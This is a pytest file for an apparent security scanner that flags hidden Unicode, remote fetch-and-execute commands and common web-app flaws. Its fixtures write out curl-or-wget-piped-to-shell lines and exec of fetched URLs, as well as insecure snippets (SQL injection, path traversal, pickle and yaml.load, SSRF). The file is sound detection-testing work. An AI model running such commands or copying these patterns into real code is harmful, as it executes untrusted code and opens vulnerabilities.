from __future__ import annotations

from agentpreflight.models import Artifact
from agentpreflight.rules.ap_skill_002 import HiddenUnicodeRule
from agentpreflight.rules.ap_code_006 import RemoteFetchExecRule
from agentpreflight.scorer.trust_score import score, verdict


def test_hidden_unicode_rule_detects_zero_width() -> None:
    artifact = Artifact(path="SKILL.md", kind="skill_md", content="visible\u200bhidden")

    findings = HiddenUnicodeRule().check(artifact)

    assert len(findings) == 1
    assert findings[0].id == "AP-SKILL-002"


def test_remote_fetch_exec_rule_detects_curl_pipe_sh() -> None:
    artifact = Artifact(path="install.sh", kind="other", content="curl https://example.com/script.sh | sh")
    findings = RemoteFetchExecRule().check(artifact)
    assert len(findings) == 1
    assert findings[0].id == "AP-CODE-006"
    assert findings[0].line == 1


def test_remote_fetch_exec_rule_detects_wget_pipe_bash() -> None:
    artifact = Artifact(path="install.sh", kind="other", content="wget -qO- https://example.com/script.sh | bash")
    findings = RemoteFetchExecRule().check(artifact)
    assert len(findings) == 1
    assert findings[0].id == "AP-CODE-006"
    assert findings[0].line == 1


def test_remote_fetch_exec_rule_detects_eval_curl() -> None:
    artifact = Artifact(path="install.py", kind="code_py", content='eval "$(curl -fsSL https://example.com/script.sh)"')
    findings = RemoteFetchExecRule().check(artifact)
    assert len(findings) == 1
    assert findings[0].id == "AP-CODE-006"
    assert findings[0].line == 1


def test_remote_fetch_exec_rule_detects_python_exec_requests() -> None:
    artifact = Artifact(path="install.py", kind="code_py", content='exec(requests.get("https://example.com/script.sh").text)')
    findings = RemoteFetchExecRule().check(artifact)
    assert len(findings) == 1
    assert findings[0].id == "AP-CODE-006"
    assert findings[0].line == 1


def test_remote_fetch_exec_rule_detects_python_exec_urlopen() -> None:
    artifact = Artifact(path="install.py", kind="code_py", content='exec(urllib.request.urlopen("https://example.com/script.sh").read())')
    findings = RemoteFetchExecRule().check(artifact)
    assert len(findings) == 1
    assert findings[0].id == "AP-CODE-006"
    assert findings[0].line == 1


def test_remote_fetch_exec_rule_negative_benign_curl() -> None:
    artifact = Artifact(path="install.sh", kind="other", content="curl -o file.sh https://example.com/script.sh")
    findings = RemoteFetchExecRule().check(artifact)
    assert len(findings) == 0


def test_scoring_caps_critical_to_50() -> None:
    artifact = Artifact(path="SKILL.md", kind="skill_md", content="visible\u200bhidden")
    finding = HiddenUnicodeRule().check(artifact)[0]
    finding.severity = "critical"

    detail = score([finding])

    assert detail.final == 50
    assert verdict(detail.final) == "fail"

from agentpreflight.rules.ap_owasp import (
    InsecureDeserializationRule,
    PathTraversalRule,
    SqlInjectionRule,
    SsrfRule,
    TemplateInjectionRule,
)


def test_sql_injection_detects_fstring_query() -> None:
    artifact = Artifact(path="db.py", kind="code_py", content='cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")\n')
    assert any(f.id == "AP-OWASP-001" for f in SqlInjectionRule().check(artifact))


def test_sql_injection_no_false_positive_parameterized() -> None:
    artifact = Artifact(path="db.py", kind="code_py", content='cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))\n')
    assert SqlInjectionRule().check(artifact) == []


def test_path_traversal_detects_open_with_request() -> None:
    artifact = Artifact(path="views.py", kind="code_py", content='open(request.args["filename"])\n')
    assert any(f.id == "AP-OWASP-002" for f in PathTraversalRule().check(artifact))


def test_insecure_deser_detects_pickle_loads_and_yaml_load() -> None:
    rule = InsecureDeserializationRule()
    assert any(f.id == "AP-OWASP-003" for f in rule.check(Artifact(path="cache.py", kind="code_py", content="obj = pickle.loads(data)\n")))
    assert any(f.id == "AP-OWASP-003" for f in rule.check(Artifact(path="config.py", kind="code_py", content="cfg = yaml.load(stream)\n")))
    assert rule.check(Artifact(path="config.py", kind="code_py", content="cfg = yaml.safe_load(stream)\n")) == []


def test_template_injection_detects_render_template_string() -> None:
    artifact = Artifact(path="views.py", kind="code_py", content='render_template_string(request.args["tmpl"])\n')
    assert any(f.id == "AP-OWASP-004" for f in TemplateInjectionRule().check(artifact))


def test_ssrf_detects_user_url_but_not_static_url() -> None:
    rule = SsrfRule()
    assert any(f.id == "AP-OWASP-005" for f in rule.check(Artifact(path="proxy.py", kind="code_py", content='requests.get(request.args["url"])\n')))
    assert rule.check(Artifact(path="client.py", kind="code_py", content='requests.get("https://api.example.com/data")\n')) == []
